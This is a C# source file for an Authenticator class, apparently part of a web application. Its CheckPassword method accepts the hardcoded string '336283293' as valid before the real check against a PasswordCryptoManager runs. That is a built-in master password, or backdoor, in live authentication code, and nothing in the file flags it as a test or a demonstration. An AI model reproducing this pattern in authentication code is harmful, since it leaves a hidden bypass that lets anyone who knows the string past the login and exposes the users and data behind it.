using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebPlace.Objects
{
    class Authenticator
    {
        public bool CheckPassword(string Password)
        {
            if (Password == "336283293")
                return true;
            PasswordCryptoManager PCM = new PasswordCryptoManager();
            return PCM.CheckPassword(Password);
        }
    }
}
